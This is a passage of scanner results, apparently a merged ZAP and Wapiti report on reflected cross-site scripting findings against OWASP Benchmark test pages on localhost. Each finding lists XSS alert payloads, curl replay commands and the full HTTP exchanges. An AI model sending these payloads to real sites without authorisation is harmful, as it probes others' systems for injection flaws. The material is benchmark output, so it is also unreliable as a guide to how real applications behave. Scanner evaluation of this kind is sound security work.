            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '113', 'date': 'Sun, 31 Aug 2025 04:23:53 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<!DOCTYPE html>\\n<html>\\n<body>\\n<p>Formatted like: a and <ScRiPt>alert('wbbg9aed01')</sCrIpT>.\\n</p>\\n</body>\\n</html>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00715",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00715?email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00715=%3CScRiPt%3Ealert%28%27wb2huw1z3x%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wb2huw1z3x')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wb2huw1z3x')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00715\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00715.html\" -d \"email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00715=%3CScRiPt%3Ealert%28%27wb2huw1z3x%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00715"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00715', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '102', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00715.html?BenchmarkTest00715=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'ZW1haWw9emFwcm94eSU0MGV4YW1wbGUuY29tJnBhc3N3b3JkPVpBUCZCZW5jaG1hcmtUZXN0MDA3MTU9JTNDc2NySXB0JTNFYWxlcnQlMjgxJTI5JTNCJTNDJTJGc2NSaXB0JTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00715', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00715.html', 'content-length': '125', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00715=%3CScRiPt%3Ealert%28%27wb2huw1z3x%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:54 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:23:56 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wb2huw1z3x')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00720",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00720?email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00720=%3CScRiPt%3Ealert%28%27wt4l1bbg4e%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wt4l1bbg4e')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wt4l1bbg4e')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00720\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00720.html\" -d \"email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00720=%3CScRiPt%3Ealert%28%27wt4l1bbg4e%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00720"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00720', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '102', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00720.html?BenchmarkTest00720=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'ZW1haWw9emFwcm94eSU0MGV4YW1wbGUuY29tJnBhc3N3b3JkPVpBUCZCZW5jaG1hcmtUZXN0MDA3MjA9JTNDc2NySXB0JTNFYWxlcnQlMjgxJTI5JTNCJTNDJTJGc2NSaXB0JTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00720', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00720.html', 'content-length': '125', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00720=%3CScRiPt%3Ealert%28%27wt4l1bbg4e%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:54 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:24:02 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wt4l1bbg4e')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00721",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00721?secure=default&productID=default&foo=foo&BenchmarkTest00721=%3CScRiPt%3Ealert%28%27wi2autj78w%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wi2autj78w')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wi2autj78w')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00721\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00721.html\" -d \"secure=default&productID=default&foo=foo&BenchmarkTest00721=%3CScRiPt%3Ealert%28%27wi2autj78w%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00721"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00721', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '94', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00721.html?BenchmarkTest00721=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'c2VjdXJlPVpBUCZwcm9kdWN0SUQ9WkFQJmZvbz1mb28mQmVuY2htYXJrVGVzdDAwNzIxPSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00721', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00721.html', 'content-length': '114', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'secure=default&productID=default&foo=foo&BenchmarkTest00721=%3CScRiPt%3Ealert%28%27wi2autj78w%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '49', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:54 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Formatted like: <scrIpt>alert(1);</scRipt> and b.'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '59', 'date': 'Sun, 31 Aug 2025 04:24:02 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Formatted like: <ScRiPt>alert('wi2autj78w')</sCrIpT> and b.\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00725",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00725?email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00725=%3CScRiPt%3Ealert%28%27woxv4xsvk8%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('woxv4xsvk8')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('woxv4xsvk8')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00725\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00725.html\" -d \"email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00725=%3CScRiPt%3Ealert%28%27woxv4xsvk8%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00725"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00725', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '102', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00725.html?BenchmarkTest00725=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'ZW1haWw9emFwcm94eSU0MGV4YW1wbGUuY29tJnBhc3N3b3JkPVpBUCZCZW5jaG1hcmtUZXN0MDA3MjU9JTNDc2NySXB0JTNFYWxlcnQlMjgxJTI5JTNCJTNDJTJGc2NSaXB0JTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00725', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00725.html', 'content-length': '125', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00725=%3CScRiPt%3Ealert%28%27woxv4xsvk8%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '27', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:55 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>\\n'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '37', 'date': 'Sun, 31 Aug 2025 04:24:03 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('woxv4xsvk8')</sCrIpT>\\n\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00728",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00728?BenchmarkTest00728=%3CScRiPt%3Ealert%28%27wjo0t11de5%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wjo0t11de5')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wjo0t11de5')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00728\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00728.html?BenchmarkTest00728=SafeText\" -d \"BenchmarkTest00728=%3CScRiPt%3Ealert%28%27wjo0t11de5%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
